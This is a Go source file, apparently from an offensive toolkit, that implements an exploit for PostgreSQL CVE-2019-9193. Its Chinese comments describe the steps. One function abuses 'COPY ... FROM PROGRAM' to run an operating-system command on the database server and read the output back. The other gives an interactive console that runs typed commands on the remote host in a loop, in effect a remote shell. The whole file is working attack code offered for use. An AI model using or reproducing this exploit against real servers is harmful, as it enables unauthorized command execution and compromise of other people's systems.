package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"os"
	"strings"
)

func cve_2019_9193_cmd(cmd string, conn *sql.DB) {
	Info("删除用来保存命令输出但是可能存在的表")
	_, err := postgrecmd("DROP TABLE IF EXISTS cmd_exec;", conn)
	if err != nil {
		Err(err)
	}

	Info("创建保存命令输出的表")
	_, err = postgrecmd("CREATE TABLE cmd_exec(cmd_output text);", conn)
	if err != nil {
		Err(err)
	}

	Info("执行系统命令")
	// _, err = postgrecmd("COPY cmd_exec FROM PROGRAM 'id';", conn)
	_, err = postgrecmd(fmt.Sprintf("COPY cmd_exec FROM PROGRAM '%s';", cmd), conn)
	if err != nil {
		Err(err)
	}

	Info("查看执行结果")
	_, err = postgrecmd("SELECT * FROM cmd_exec;", conn)
	if err != nil {
		Err(err)
	}
}

func cve_2019_9193_console(conn *sql.DB) {
	Info("删除用来保存命令输出但是可能存在的表")
	_, err := postgrecmd("DROP TABLE IF EXISTS cmd_exec;", conn)
	if err != nil {
		Err(err)
	}

	Info("创建保存命令输出的表")
	_, err = postgrecmd("CREATE TABLE cmd_exec(cmd_output text);", conn)
	if err != nil {
		Err(err)
	}

	Info("执行系统命令")
	reader := bufio.NewReader(os.Stdin)
	for {
		//
		postsqlcmd := "COPY cmd_exec FROM PROGRAM '"
		var cmd string
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ = reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		aa := fmt.Sprintf("%s%s';", postsqlcmd, cmd)
		postsqlcmd = strings.TrimRight(postsqlcmd, "\r\n")
		Info(aa)
		_, err = postgrecmd(aa, conn)
		if err != nil {
			Err(err)
		}
		Info("查看执行结果")
		_, err = postgrecmd("SELECT * FROM cmd_exec;", conn)
		if err != nil {
			Err(err)
		}
		// 执行完命令输出到控制台后，清空数据表中的内容
		_, err = postgrecmd("DELETE FROM cmd_exec;", conn)
		if err != nil {
			Err(err)
		}
	}
}
